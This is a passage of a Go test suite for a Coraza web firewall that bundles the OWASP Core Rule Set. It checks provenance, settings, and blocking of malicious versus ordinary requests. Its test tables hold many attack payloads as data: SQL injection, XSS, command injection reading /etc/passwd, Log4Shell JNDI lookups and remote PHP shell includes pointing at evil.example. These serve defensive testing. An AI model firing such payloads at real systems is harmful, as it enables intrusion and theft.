package crs_test

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/corazawaf/coraza/v3"
	"github.com/corazawaf/coraza/v3/experimental"
	txhttp "github.com/corazawaf/coraza/v3/http"
	"github.com/corazawaf/coraza/v3/types"

	"github.com/YurilLAB/coraza/carnical/crs"
)

// The fingerprint the CRS project publishes for its release key (SECURITY.md in coreruleset/coreruleset). It is
// written out again here, apart from tools/update-crs, so that changing one place alone is noticed.
const publishedFingerprint = "36006F0E0BA167832158821138EEACA1AB8A6E72"

func TestEmbeddedRulesAreExactlyWhatWasVerified(t *testing.T) {
	p, err := crs.Info()
	if err != nil {
		t.Fatal(err)
	}
	if p.SignerFingerprint != publishedFingerprint {
		t.Fatalf("signer %s is not the CRS release key %s", p.SignerFingerprint, publishedFingerprint)
	}
	for name, v := range map[string]string{"archive": p.ArchiveSHA256, "signature": p.SignatureSHA256} {
		if len(v) != 64 {
			t.Fatalf("%s hash %q is not a SHA-256", name, v)
		}
	}
	if !strings.HasPrefix(p.Source, "https://github.com/coreruleset/coreruleset/releases/download/v"+p.Version+"/") {
		t.Fatalf("source %q does not match version %s", p.Source, p.Version)
	}
	seen := map[string]bool{}
	entries, err := fs.ReadDir(crs.FS(), "owasp_crs")
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		data, err := fs.ReadFile(crs.FS(), "owasp_crs/"+e.Name())
		if err != nil {
			t.Fatal(err)
		}
		sum := sha256.Sum256(data)
		want, ok := p.Files[e.Name()]
		if !ok {
			t.Errorf("%s is embedded but not in provenance.json", e.Name())
		} else if hex.EncodeToString(sum[:]) != want {
			t.Errorf("%s differs from the verified release", e.Name())
		}
		seen[e.Name()] = true
	}
	for name := range p.Files {
		if !seen[name] {
			t.Errorf("%s is in provenance.json but not embedded", name)
		}
	}
	if len(entries) < 40 {
		t.Fatalf("only %d files embedded", len(entries))
	}
}

func TestBaseConfigIsUpstreamsRecommendedConfig(t *testing.T) {
	// The CRS needs the body processors and strict-parsing rules in this file. After merging a new Coraza release,
	// copy ../coraza.conf-recommended to crs/base/coraza.conf; this test says when that is needed.
	upstream, err := os.ReadFile("../../coraza.conf-recommended")
	if err != nil {
		t.Skipf("upstream file not found: %v", err)
	}
	ours, err := fs.ReadFile(crs.FS(), "base/coraza.conf")
	if err != nil {
		t.Fatal(err)
	}
	norm := func(b []byte) []byte { return bytes.ReplaceAll(b, []byte("\r\n"), []byte("\n")) }
	if !bytes.Equal(norm(upstream), norm(ours)) {
		t.Fatal("crs/base/coraza.conf differs from coraza.conf-recommended")
	}
	// The proxy budgets only the response write that reaches this limit, so it must be the one the file sets.
	if !bytes.Contains(norm(ours), []byte(fmt.Sprintf("\nSecResponseBodyLimit %d\n", crs.ResponseBodyLimit))) {
		t.Fatal("crs.ResponseBodyLimit is not the SecResponseBodyLimit of base/coraza.conf")
	}
	s := crs.DefaultSettings()
	if s.ResponseLimit() != crs.ResponseBodyLimit {
		t.Fatal("the default settings do not report the base response limit")
	}
	if s.After = `SecRule REQUEST_URI "@beginsWith /export" "id:1,phase:1,pass,nolog,ctl:responseBodyLimit=1024"`; s.ResponseLimit() != 0 {
		t.Fatal("a limit the operator's directives may change was reported as known")
	}
}

func TestSettingsAreValidated(t *testing.T) {
	good := crs.DefaultSettings()
	if _, err := good.Directives(); err != nil {
		t.Fatalf("defaults refused: %v", err)
	}
	for name, change := range map[string]func(*crs.Settings){
		"unknown mode":             func(s *crs.Settings) { s.Mode = "maybe" },
		"paranoia 0":               func(s *crs.Settings) { s.ParanoiaLevel = 0 },
		"paranoia 5":               func(s *crs.Settings) { s.ParanoiaLevel = 5 },
		"detection below paranoia": func(s *crs.Settings) { s.ParanoiaLevel, s.DetectionParanoiaLevel = 3, 2 },
		"detection above 4":        func(s *crs.Settings) { s.DetectionParanoiaLevel = 5 },
		"zero threshold":           func(s *crs.Settings) { s.InboundThreshold = 0 },
		"huge threshold":           func(s *crs.Settings) { s.OutboundThreshold = 5000 },
		"tiny body limit":          func(s *crs.Settings) { s.RequestBodyLimit = 10 },
		"huge body limit":          func(s *crs.Settings) { s.RequestBodyLimit = 1 << 40 },
		"lower-case method":        func(s *crs.Settings) { s.AllowedMethods = []string{"get"} },
		"method with a space":      func(s *crs.Settings) { s.AllowedMethods = []string{"GET HEAD"} },
		"method with a quote":      func(s *crs.Settings) { s.AllowedMethods = []string{`GET"`} },
		"a CRS rule as local":      func(s *crs.Settings) { s.LocalRulesOff = []int{942100} },
		"an unknown local rule":    func(s *crs.Settings) { s.LocalRulesOff = []int{5006012, 5006999} },
		"33 local rules off":       func(s *crs.Settings) { s.LocalRulesOff = slices.Repeat([]int{5006012}, 33) },
	} {
		s := good
		change(&s)
		if _, err := s.Directives(); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
	for name, change := range map[string]func(*crs.Settings){
		"paranoia 4":  func(s *crs.Settings) { s.ParanoiaLevel = 4 },
		"detect at 4": func(s *crs.Settings) { s.ParanoiaLevel, s.DetectionParanoiaLevel = 1, 4 },
		"REST methods": func(s *crs.Settings) {
			s.AllowedMethods = []string{"GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"}
		},
		"responses on":  func(s *crs.Settings) { s.InspectResponses = true },
		"detect mode":   func(s *crs.Settings) { s.Mode = crs.ModeDetect },
		"off":           func(s *crs.Settings) { s.Mode = crs.ModeOff },
		"stricter":      func(s *crs.Settings) { s.InboundThreshold = 3 },
		"bigger bodies": func(s *crs.Settings) { s.RequestBodyLimit = 8 << 20 },
		"32 local rules off": func(s *crs.Settings) {
			s.LocalRulesOff = append(slices.Repeat([]int{5006012}, 31), 5006001)
		},
	} {
		s := good
		change(&s)
		if _, err := s.Directives(); err != nil {
			t.Errorf("%s refused: %v", name, err)
		}
	}
}

// newWAF compiles the CRS the way a server would, and collects what the rules report.
func newWAF(t testing.TB, s crs.Settings) (coraza.WAF, *reports) {
	t.Helper()
	directives, err := s.Directives()
	if err != nil {
		t.Fatal(err)
	}
	r := &reports{}
	waf, err := coraza.NewWAF(coraza.NewWAFConfig().WithRootFS(crs.FS()).WithDirectives(directives).
		WithErrorCallback(func(m types.MatchedRule) { r.add(m.Rule().ID(), m.Message()) }))
	if err != nil {
		t.Fatalf("the CRS did not load: %v", err)
	}
	if c, ok := waf.(experimental.WAFCloser); ok {
		t.Cleanup(func() { c.Close() })
	}
	return waf, r
}

type reports struct {
	mu  sync.Mutex
	ids []int
}

func (r *reports) add(id int, _ string) { r.mu.Lock(); r.ids = append(r.ids, id); r.mu.Unlock() }
func (r *reports) count() int           { r.mu.Lock(); defer r.mu.Unlock(); return len(r.ids) }

func TestEveryParanoiaLevelLoadsTheWholeRuleSet(t *testing.T) {
	previous := 0
	for level := 1; level <= 4; level++ {
		s := crs.DefaultSettings()
		s.ParanoiaLevel = level
		waf, _ := newWAF(t, s)
		n := waf.(experimental.WAFWithRules).RulesCount()
		if n < 300 {
			t.Errorf("paranoia %d: only %d rules loaded", level, n)
		}
		if previous != 0 && n != previous {
			t.Errorf("rule count changed with the paranoia level (%d, then %d): levels are set by variables, not by loading different rules", previous, n)
		}
		previous = n
	}
	t.Logf("CRS %s: %d rules", crs.Version(), previous)
}

func serve(t testing.TB, s crs.Settings) (*httptest.Server, *reports) {
	t.Helper()
	waf, r := newWAF(t, s)
	srv := httptest.NewServer(txhttp.WrapHandler(waf, http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		io.Copy(io.Discard, req.Body)
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte("reached the application"))
	})))
	t.Cleanup(srv.Close)
	return srv, r
}

func do(t testing.TB, srv *httptest.Server, method, target, contentType, body string, headers map[string]string) int {
	t.Helper()
	req, err := http.NewRequest(method, srv.URL+target, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	req.Host = "shop.example.test" // an IP address as the Host is itself a CRS warning (rule 920350)
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/json")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode
}

const form = "application/x-www-form-urlencoded"

func TestTheRuleSetBlocksCommonAttacksAndPassesOrdinaryTraffic(t *testing.T) {
	srv, _ := serve(t, crs.DefaultSettings())
	q := func(v string) string { return "/search?q=" + url.QueryEscape(v) }
	for name, tc := range map[string]struct {
		method, target, ct, body string
		headers                  map[string]string
		want                     int
	}{
		"sql injection in the query":           {"GET", q("1' OR '1'='1' --"), "", "", nil, 403},
		"union select":                         {"GET", q("1 UNION SELECT username,password FROM users"), "", "", nil, 403},
		"sql injection in a form":              {"POST", "/login", form, "user=admin'--&pass=x", nil, 403},
		"script tag in the query":              {"GET", q("<script>alert(document.cookie)</script>"), "", "", nil, 403},
		"event handler":                        {"GET", q(`"><img src=x onerror=alert(1)>`), "", "", nil, 403},
		"path traversal":                       {"GET", q("../../../../etc/passwd"), "", "", nil, 403},
		"encoded traversal":                    {"GET", "/download?f=..%2f..%2f..%2fetc%2fpasswd", "", "", nil, 403},
		"command injection":                    {"GET", q("; cat /etc/passwd"), "", "", nil, 403},
		"log4shell in a header":                {"GET", "/", "", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil.example/a}"}, 403},
		"log4shell in the user agent":          {"GET", "/", "", "", map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, 403},
		"scanner user agent":                   {"GET", "/", "", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
		"php code":                             {"POST", "/x", form, "c=" + url.QueryEscape(`<?php system($_GET['c']); ?>`), nil, 403},
		"XPath boolean predicate":              {"GET", q("' or true() or 'a'='b"), "", "", nil, 403},
		"XPath arbitrary nested parentheses":   {"GET", q("' or (((true()))) or 'a'='b"), "", "", nil, 403},
		"XPath nested comments":                {"GET", q("' or (:(:nested:)comment:) true() or 'a'='b"), "", "", nil, 403},
		"XPath non-enumerated function":        {"GET", q("' or upper-case(name())='ADMIN' or 'a'='b"), "", "", nil, 403},
		"XPath comment before operator":        {"GET", q("'(:comment:)or true() or 'a'='b"), "", "", nil, 403},
		"parenthesized template arithmetic":    {"GET", q("*{(8 + 8)}"), "", "", nil, 403},
		"deeply encoded traversal":             {"GET", q("%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"), "", "", nil, 403},
		"XPath nested function":                {"POST", "/api", "application/json", `{"input":"' or (not(false())) or 'a'='b"}`, nil, 403},
		"XPath union":                          {"GET", q("'] | //user | //*['a'='a"), "", "", nil, 403},
		"shell backtick":                       {"GET", q("`id`"), "", "", nil, 403},
		"shell substitution":                   {"POST", "/api", "application/json", `{"input":"$(whoami)"}`, nil, 403},
		"quoted command spelling":              {"GET", q(";i''d"), "", "", nil, 403},
		"Windows command interpreter":          {"GET", q("cmd.exe /c dir"), "", "", nil, 403},
		"nested encoded traversal":             {"GET", q("%252e%252e%252fetc%252fpasswd"), "", "", nil, 403},
		"template arithmetic":                  {"GET", q("*{7*7}"), "", "", nil, 403},
		"template config object":               {"GET", q("{{config}}"), "", "", nil, 403},
		"Java stream marker":                   {"GET", q("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"), "", "", nil, 403},
		"hexadecimal URL host":                 {"GET", q("http://0x7f000001/"), "", "", nil, 403},
		"URL userinfo confusion":               {"GET", q("http://example.com@127.0.0.1/"), "", "", nil, 403},
		"dict fetch protocol":                  {"GET", q("dict://127.0.0.1:11211/stats"), "", "", nil, 403},
		"json body injection":                  {"POST", "/api", "application/json", `{"q":"1' OR '1'='1' --"}`, nil, 403},
		"PHPUnit eval-stdin":                   {"GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", "", nil, 403},
		"PHP in WordPress uploads":             {"GET", "/wp-content/uploads/2024/05/x.php", "", "", nil, 403},
		"PHP with a second extension":          {"GET", "/wp-content/uploads/x.php.jpg", "", "", nil, 403},
		"PHP path info in the cache folder":    {"GET", "/wp-content/cache/x.phtml/y", "", "", nil, 403},
		"PHP in the upgrade folder":            {"GET", "/wp-content/upgrade/x.php5", "", "", nil, 403},
		"encoded PHP extension":                {"GET", "/wp-content/uploads/x.%70hp", "", "", nil, 403},
		"double-encoded PHP extension":         {"GET", "/wp-content/uploads/x.%2570hp", "", "", nil, 403},
		"PHP in uploads in capitals":           {"GET", "/WP-CONTENT/Uploads/X.PHP", "", "", nil, 403},
		"PHP in uploads with backslashes":      {"GET", "/wp-content%5cuploads%5cx.php", "", "", nil, 403},
		"PHP in uploads through a dot segment": {"GET", "/wp-content/plugins/../uploads/x.php", "", "", nil, 403},
		"File Manager connector":               {"POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", form, "cmd=upload", nil, 403},
		"File Manager standalone connector":    {"POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.standalone.php", form, "cmd=upload", nil, 403},
		"PHP in File Manager's files folder":   {"GET", "/wp-content/plugins/wp-file-manager/lib/files/x.php", "", "", nil, 403},
		"Slider Revolution update folder":      {"GET", "/wp-content/plugins/revslider/temp/update_extract/revslider/x.php", "", "", nil, 403},
		"web shell by name":                    {"GET", "/images/c99.php", "", "", nil, 403},
		"web shell with a query":               {"GET", "/wso.php?cmd=x", "", "", nil, 403},
		"Laravel Ignition solution":            {"POST", "/_ignition/execute-solution", "application/json", `{"solution":"x"}`, nil, 403},
		"Spring actuator environment":          {"GET", "/actuator/env", "", "", nil, 403},
		"actuator heap dump":                   {"GET", "/manage/actuator/heapdump", "", "", nil, 403},
		"actuator behind a path parameter":     {"GET", "/actuator;a=b/configprops", "", "", nil, 403},
		"encoded actuator name":                {"GET", "/actuator/%65nv", "", "", nil, 403},
		"Jolokia":                              {"GET", "/jolokia/list", "", "", nil, 403},
		"Go profiler":                          {"GET", "/debug/pprof/heap", "", "", nil, 403},
		"Go expvar":                            {"GET", "/debug/vars", "", "", nil, 403},
		"Apache server-status":                 {"GET", "/server-status?auto", "", "", nil, 403},
		"Symfony profiler":                     {"GET", "/_profiler/phpinfo", "", "", nil, 403},
		"Yii debug panel":                      {"GET", "/debug/default/view?panel=config", "", "", nil, 403},
		"WordPress installer":                  {"GET", "/wp-admin/install.php?step=1", "", "", nil, 403},
		"WordPress setup-config":               {"POST", "/wp-admin/setup-config.php?step=2", form, "dbname=x", nil, 403},
		"WordPress installer in a subfolder":   {"GET", "/blog/WP-ADMIN/install.php", "", "", nil, 403},
		"Joomla installer":                     {"GET", "/installation/index.php", "", "", nil, 403},
		"Drupal installer":                     {"GET", "/core/install.php?profile=standard", "", "", nil, 403},
		"dirsearch":                            {"GET", "/", "", "", map[string]string{"User-Agent": "dirsearch/0.4.3"}, 403},
		"jaeles":                               {"GET", "/", "", "", map[string]string{"User-Agent": "Jaeles - Automated Web Application Security Testing"}, 403},
		"remote include in page":               {"GET", "/index.php?page=" + url.QueryEscape("http://evil.example/shell.php"), "", "", nil, 403},
		"remote include in a nested key":       {"GET", "/index.php?" + url.QueryEscape("template[0]") + "=" + url.QueryEscape("https://evil.example/x"), "", "", nil, 403},
		"remote include in a dotted key":       {"POST", "/api", "application/json", `{"settings":{"module":"https://evil.example/m"}}`, nil, 403},
		"remote include in a JSON array":       {"POST", "/api", "application/json", `{"page":["http://evil.example/shell.php"]}`, nil, 403},
		"remote include in a nested array":     {"POST", "/api", "application/json", `{"a":{"template":[{"x":1},"https://evil.example/m"]}}`, nil, 403},
		"remote include in capitals":           {"GET", "/index.php?FILE=" + url.QueryEscape("HTTP://EVIL.EXAMPLE/X"), "", "", nil, 403},
		"remote include without a scheme":      {"GET", "/index.php?inc=" + url.QueryEscape("//evil.example/x"), "", "", nil, 403},
		"remote include with a port":           {"GET", "/index.php?path=" + url.QueryEscape("http://evil.example:8080/x"), "", "", nil, 403},
		"remote include to an address":         {"GET", "/index.php?page=" + url.QueryEscape("http://[2001:db8::1]/x"), "", "", nil, 403},
		"remote include with userinfo":         {"GET", "/index.php?page=" + url.QueryEscape("http://shop.example.test@evil.example/x"), "", "", nil, 403},
		"remote include after a local one":     {"GET", "/index.php?page=" + url.QueryEscape("http://shop.example.test/a") + "&page=" + url.QueryEscape("http://evil.example/b"), "", "", nil, 403},
		"remote include before a local one":    {"GET", "/index.php?page=" + url.QueryEscape("http://evil.example/b") + "&page=" + url.QueryEscape("http://shop.example.test/a"), "", "", nil, 403},
		"look-alike suffix host":               {"GET", "/index.php?page=" + url.QueryEscape("http://evilshop.example.test/x"), "", "", nil, 403},
		"FTP address in any field":             {"GET", "/x?u=" + url.QueryEscape("ftp://evil.example/x"), "", "", nil, 403},
		"SMB address in any field":             {"GET", "/x?u=" + url.QueryEscape(`\\evil.example\share\x`), "", "", nil, 403},
		"SSH2 wrapper in any field":            {"GET", "/x?u=" + url.QueryEscape("ssh2.exec://evil.example/id"), "", "", nil, 403},
		"scheme-less host in any field":        {"GET", "/x?u=" + url.QueryEscape("//evil.example/x"), "", "", nil, 403},
		"remote text file in any field":        {"GET", "/x?u=" + url.QueryEscape("http://evil.example/shell.txt"), "", "", nil, 403},
		"remote include file in a JSON body":   {"POST", "/api", "application/json", `{"u":"https://evil.example/a/b.inc?x=1"}`, nil, 403},
		// No XXE case: the CRS has no rule for external entities. Block them in the XML parser or with a rule of our own.
		"XPath in an XML attribute":    {"POST", "/api", "application/xml", `<input value="' or true() or 'a'='b"/>`, nil, 403},
		"benign XML attribute":         {"POST", "/api", "application/xml", `<input value="O'Brien"/>`, nil, 200},
		"home page":                    {"GET", "/", "", "", nil, 200},
		"static asset":                 {"GET", "/assets/app.css?v=3", "", "", nil, 200},
		"search for ordinary words":    {"GET", q("blue widgets for sale"), "", "", nil, 200},
		"a name with an apostrophe":    {"GET", q("O'Brien"), "", "", nil, 200},
		"plain function discussion":    {"GET", q("XPath count() and true() functions"), "", "", nil, 200},
		"plain arithmetic":             {"GET", q("7*7=49"), "", "", nil, 200},
		"template variable":            {"GET", q("{{customer_name}}"), "", "", nil, 200},
		"semicolon prose":              {"GET", q("hello; welcome home"), "", "", nil, 200},
		"ordinary login form":          {"POST", "/login", form, "user=alice&pass=correct+horse+battery", nil, 200},
		"ordinary json":                {"POST", "/api", "application/json", `{"name":"Alice","items":[1,2,3],"note":"hello world"}`, nil, 200},
		"a url in a field":             {"POST", "/profile", form, "website=" + url.QueryEscape("https://example.com/about?x=1"), nil, 200},
		"an image in uploads":          {"GET", "/wp-content/uploads/2024/05/photo.jpg", "", "", nil, 200},
		"a photo named .photo":         {"GET", "/wp-content/uploads/2024/05/x.photo.png", "", "", nil, 200},
		"a PDF about PHP":              {"GET", "/wp-content/uploads/php-guide.pdf", "", "", nil, 200},
		"a plugin's own PHP":           {"GET", "/wp-content/plugins/akismet/akismet.php", "", "", nil, 200},
		"File Manager's own script":    {"GET", "/wp-content/plugins/wp-file-manager/js/file_manager.js", "", "", nil, 200},
		"an image File Manager kept":   {"GET", "/wp-content/plugins/wp-file-manager/lib/files/logo.png", "", "", nil, 200},
		"a WordPress admin page":       {"GET", "/wp-admin/admin-ajax.php?action=heartbeat", "", "", nil, 200},
		"a page named like a shell":    {"GET", "/reviews/c99-phone", "", "", nil, 200},
		"a PHPUnit documentation page": {"GET", "/docs/phpunit/eval-stdin", "", "", nil, 200},
		"actuator health":              {"GET", "/actuator/health", "", "", nil, 200},
		"actuator info":                {"GET", "/actuator/info", "", "", nil, 200},
		"a page about server status":   {"GET", "/blog/server-status-page", "", "", nil, 200},
		"a guide to pprof":             {"GET", "/docs/debug/pprof-guide", "", "", nil, 200},
		"an install guide":             {"GET", "/wp-admin/install-guide", "", "", nil, 200},
		"a Joomla installation guide":  {"GET", "/installation/guide.html", "", "", nil, 200},
		"a page slug":                  {"GET", "/wp-admin/admin.php?page=wpseo_dashboard", "", "", nil, 200},
		"a local file in page":         {"GET", "/index.php?file=" + url.QueryEscape("reports/2024/q1.pdf"), "", "", nil, 200},
		"this site in page":            {"GET", "/index.php?page=" + url.QueryEscape("https://shop.example.test/about"), "", "", nil, 200},
		"a subdomain in page":          {"GET", "/index.php?page=" + url.QueryEscape("https://cdn.shop.example.test/a.css"), "", "", nil, 200},
		"this site twice in page":      {"GET", "/index.php?page=" + url.QueryEscape("https://shop.example.test/a") + "&page=" + url.QueryEscape("//shop.example.test/b"), "", "", nil, 200},
		"a Windows path in dir":        {"GET", "/x?dir=" + url.QueryEscape(`C:\Users\alice`), "", "", nil, 200},
		"another site in a link field": {"GET", "/matomo.php?url=" + url.QueryEscape("https://shop.example.test/x") + "&urlref=" + url.QueryEscape("https://www.google.com/search?q=widgets"), "", "", nil, 200},
		"a PHP page as a referrer":     {"GET", "/track?ref=" + url.QueryEscape("https://forum.example.org/viewtopic.php?t=1"), "", "", nil, 200},
		"a code comment":               {"POST", "/snippets", form, "code=" + url.QueryEscape("// todo.fix later"), nil, 200},
		"this site in a JSON array":    {"POST", "/api", "application/json", `{"page":["https://shop.example.test/a","https://cdn.shop.example.test/b"]}`, nil, 200},
		"paths in a JSON array":        {"POST", "/api", "application/json", `{"files":["a/b.txt","c.pdf"],"page":[1,2]}`, nil, 200},
		"a text file on this site":     {"GET", "/x?u=" + url.QueryEscape("https://shop.example.test/robots.txt"), "", "", nil, 200},
		"a text file mentioned":        {"GET", "/x?q=" + url.QueryEscape("see http://example.org/notes.txt for details"), "", "", nil, 200},
	} {
		t.Run(name, func(t *testing.T) {
			if got := do(t, srv, tc.method, tc.target, tc.ct, tc.body, tc.headers); got != tc.want {
				t.Errorf("status %d, want %d", got, tc.want)
			}
		})
	}
}

// TestEveryLocalRuleHasItsLogLabel ties the fixed labels the default log uses to the rules' own messages, so a new local
// rule is not logged without its family.
func TestEveryLocalRuleHasItsLogLabel(t *testing.T) {
	data, err := fs.ReadFile(crs.FS(), "local/REQUEST-499-CARNICAL.conf")
	if err != nil {
		t.Fatal(err)
	}
	rules := regexp.MustCompile(`"id:(\d+),[^"]*msg:'([^']*)'`).FindAllStringSubmatch(string(data), -1)
	if len(rules) < 11 || len(rules) != strings.Count(string(data), "\nSecRule ") {
		t.Fatalf("read %d rules with an id and a message", len(rules))
	}
	for _, r := range rules {
		id, _ := strconv.Atoi(r[1])
		if got := crs.LocalRuleMessage(id); got != r[2] {
			t.Errorf("rule %d: label %q, message %q", id, got, r[2])
		}
	}
	if got := crs.LocalRuleMessage(942100); got != "" {
		t.Errorf("a CRS rule has a local label: %q", got)
	}
}

func TestDetectModeReportsButNeverBlocks(t *testing.T) {
	s := crs.DefaultSettings()
	s.Mode = crs.ModeDetect
	srv, r := serve(t, s)
	if got := do(t, srv, "GET", "/search?q="+url.QueryEscape("1' OR '1'='1' --"), "", "", nil); got != 200 {
		t.Fatalf("detect mode blocked a request: %d", got)
	}
	if r.count() == 0 {
		t.Fatal("detect mode reported nothing, so it is not detecting")
	}
}

func TestModeOffRunsNoRules(t *testing.T) {
	s := crs.DefaultSettings()
	s.Mode = crs.ModeOff
	srv, r := serve(t, s)
	if got := do(t, srv, "GET", "/search?q="+url.QueryEscape("1' OR '1'='1' --"), "", "", nil); got != 200 || r.count() != 0 {
		t.Fatalf("off mode: status %d, %d reports", got, r.count())
	}
}

func TestParanoiaLevelChangesWhatIsCaught(t *testing.T) {
	// A mild probe that only the stricter levels score high enough to block: an unusual character in a name.
	probe := "/x?name=" + url.QueryEscape("select * from")
	low := crs.DefaultSettings()
	high := crs.DefaultSettings()
	high.ParanoiaLevel = 4
	lowSrv, _ := serve(t, low)
	highSrv, _ := serve(t, high)
	a, b := do(t, lowSrv, "GET", probe, "", "", nil), do(t, highSrv, "GET", probe, "", "", nil)
	t.Logf("paranoia 1: %d, paranoia 4: %d", a, b)
	if b != 403 {
		t.Fatalf("paranoia 4 did not block the probe (%d)", b)
	}
	if a == 403 {
		t.Logf("note: paranoia 1 already blocked this probe; the assertion above still holds")
	}
}

func TestAThresholdOfOneBlocksWhatTheDefaultTolerates(t *testing.T) {
	// A request that scores a single warning passes at the default threshold of 5 and is blocked when the
	// threshold is lowered to 1. The warning here is a Host that is an IP address (rule 920350, worth 3 points).
	strict := crs.DefaultSettings()
	strict.InboundThreshold = 1
	loose, _ := serve(t, crs.DefaultSettings())
	tight, _ := serve(t, strict)
	call := func(srv *httptest.Server) int {
		req, _ := http.NewRequest("GET", srv.URL+"/", nil)
		req.Host = "192.0.2.10"
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept", "text/html")
		resp, err := srv.Client().Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp.StatusCode
	}
	if a, b := call(loose), call(tight); a != 200 || b != 403 {
		t.Fatalf("default threshold: %d (want 200), threshold 1: %d (want 403)", a, b)
	}
}

func TestOnlyAllowedMethodsPass(t *testing.T) {
	plain, _ := serve(t, crs.DefaultSettings())
	api := crs.DefaultSettings()
	api.AllowedMethods = []string{"GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"}
	rest, _ := serve(t, api)
	if got := do(t, plain, "PUT", "/item/1", "application/json", `{"a":1}`, nil); got != 403 {
		t.Errorf("PUT with the CRS default list: %d, want 403", got)
	}
	if got := do(t, rest, "PUT", "/item/1", "application/json", `{"a":1}`, nil); got != 200 {
		t.Errorf("PUT with PUT allowed: %d, want 200", got)
	}
}

func TestAnOversizedBodyIsRefusedNotTruncated(t *testing.T) {
	s := crs.DefaultSettings()
	s.RequestBodyLimit = 4096
	srv, _ := serve(t, s)
	big := "a=" + strings.Repeat("x", 10000)
	if got := do(t, srv, "POST", "/p", form, big, nil); got == 200 {
		t.Fatal("a body over the limit reached the application")
	}
	if got := do(t, srv, "POST", "/p", form, "a=small", nil); got != 200 {
		t.Fatalf("a small body was refused: %d", got)
	}
	// The attack sits after the limit, where a truncating engine would never look.
	late := "a=" + strings.Repeat("x", 4090) + "&b=" + url.QueryEscape("1' OR '1'='1' --")
	if got := do(t, srv, "POST", "/p", form, late, nil); got == 200 {
		t.Fatal("an attack placed after the body limit reached the application")
	}
}

func TestExclusionsCanBeAddedBeforeTheRules(t *testing.T) {
	// The CRS way to silence a false positive on one route: a rule that removes a rule from that route.
	s := crs.DefaultSettings()
	s.Before = `SecRule REQUEST_URI "@beginsWith /editor/" "id:1000001,phase:1,pass,nolog,ctl:ruleRemoveById=941100-941999"`
	srv, _ := serve(t, s)
	html := form
	body := "content=" + url.QueryEscape("<b>bold</b> <script>alert(1)</script>")
	if got := do(t, srv, "POST", "/other/", html, body, nil); got != 403 {
		t.Errorf("an XSS body outside the excluded route: %d, want 403", got)
	}
	if got := do(t, srv, "POST", "/editor/save", html, body, nil); got != 200 {
		t.Errorf("an XSS body on the excluded route: %d, want 200", got)
	}
	if got := do(t, srv, "POST", "/editor/save", html, "id="+url.QueryEscape("1' OR '1'='1' --"), nil); got != 403 {
		t.Errorf("the exclusion removed more than the XSS rules: %d, want 403", got)
	}
}

// The CRS blocks several of these requests too (a remote include is also a path traversal, a scheme, a PHP wrapper). With its
// detection rules removed (911000 to 948999; the scoring and the blocking decision stay) what refuses a request is a local rule
// alone, so a weakening of one of them cannot hide behind the CRS.
func TestLocalRulesRefuseOnTheirOwn(t *testing.T) {
	s := crs.DefaultSettings()
	s.After = "SecRuleRemoveById 911000-948999"
	srv, _ := serve(t, s)
	if got := do(t, srv, "GET", "/search?q="+url.QueryEscape("1' OR '1'='1' --"), "", "", nil); got != 200 {
		t.Fatalf("an attack only a CRS rule recognises: %d, want 200 (the CRS rules were not removed)", got)
	}
	inc := func(name, value string) string { return "/index.php?" + name + "=" + url.QueryEscape(value) }
	for name, tc := range map[string]struct {
		target  string
		headers map[string]string
		want    int
	}{
		"debug interface":              {"/actuator/heapdump", nil, 403},
		"installer":                    {"/wp-admin/setup-config.php", nil, 403},
		"scanner":                      {"/", map[string]string{"User-Agent": "dirsearch/0.4.3"}, 403},
		"include with a host name":     {inc("page", "http://evil.example/x"), nil, 403},
		"include with an IPv6 host":    {inc("page", "http://[2001:db8::1]/x"), nil, 403},
		"include with a bare IPv6":     {inc("file", "//[2001:db8::1]/x"), nil, 403},
		"include with a plain scheme":  {inc("template", "gopher://evil.example/x"), nil, 403},
		"include behind userinfo":      {inc("page", "http://shop.example.test@evil.example/x"), nil, 403},
		"Jolokia":                      {"/jolokia/list", nil, 403},
		"Joomla installer":             {"/installation/index.php", nil, 403},
		"Drupal installer":             {"/core/install.php", nil, 403},
		"FTP address":                  {"/x?u=" + url.QueryEscape("ftp://evil.example/x"), nil, 403},
		"FTPS address":                 {"/x?u=" + url.QueryEscape("ftps://evil.example/x"), nil, 403},
		"bare IPv6 in any field":       {"/x?u=" + url.QueryEscape("//[2001:db8::1]/x"), nil, 403},
		"SMB path":                     {"/x?u=" + url.QueryEscape(`\\evil.example\share`), nil, 403},
		"SSH2 wrapper":                 {"/x?u=" + url.QueryEscape("ssh2.exec://evil.example/id"), nil, 403},
		"SSH2 SFTP wrapper":            {"/x?u=" + url.QueryEscape("ssh2.sftp://evil.example/id"), nil, 403},
		"scheme-less host":             {"/x?u=" + url.QueryEscape("//evil.example/x"), nil, 403},
		"remote text file":             {"/x?u=" + url.QueryEscape("http://evil.example/shell.txt"), nil, 403},
		"remote include file":          {"/x?u=" + url.QueryEscape("https://evil.example/lib.inc?x=1"), nil, 403},
